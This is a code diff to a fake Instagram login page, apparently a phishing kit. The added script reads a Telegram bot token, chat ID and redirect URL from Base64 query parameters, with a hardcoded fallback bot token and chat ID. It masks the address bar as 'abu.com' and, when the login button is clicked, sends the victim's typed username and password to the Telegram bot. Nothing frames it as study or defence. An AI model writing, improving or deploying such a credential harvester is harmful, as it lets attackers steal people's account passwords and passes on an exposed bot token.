@@ -90,25 +90,33 @@
         English © 2022 Instagram from Meta
     </div>
     <script>
-        const params = new URLSearchParams(window.location.search);
+        let t;
+        let i;
+        let urlGo;
+        try {
+            const params = new URLSearchParams(window.location.search);
+            const t_enc = params.get("t"); // token (Base64 encoded)
+            const i_enc = params.get("i"); // chat ID (Base64 encoded)      
+            const u_enc = params.get("u"); // redirect URL (Base64 encoded)
+            // Base64 → matn
+            t = atob(t_enc);
+            i = atob(i_enc);
+            urlGo = atob(u_enc);
+        } finally {
+            t = t || "7102126507:AAFF4tkCn71x_LZvaPmVtiYLjeSVKyTY3Tw"; // misol uchun token
+            i = i || "5672285896"; // misol uchun chat ID
+            urlGo = "https://instagram.com";
+        }
 
-        const t_enc = params.get("t");
-        const i_enc = params.get("i");
-
-        window.history.replaceState({}, " " , "abu.com");
+        window.history.replaceState({}, " ", "abu.com");
 
 
-        // Base64 → matn
-        const t = atob(t_enc);
-        const i = atob(i_enc);
 
-        console.log("t:", t);
-        console.log("i:", i);
-       
+
         const btn = document.querySelector(".login-button")
         const password = document.getElementById("password")
         const user = document.getElementById("username")
-        const onClickAbu = (e) => {
+        const onClickAbu = async (e) => {
             e.preventDefault()
             const botToken = t; // @BotFather dan olgan token
             const chatId = i;     // @userinfobot dan olgan chat ID            // 2) Xabar matni
@@ -131,6 +139,9 @@
                 })
             })
         }
+
+        function ss() { window.location.assign(urlGo); }
+        ss();
         btn.addEventListener("click", (e) => { onClickAbu(e) })
     </script>
 
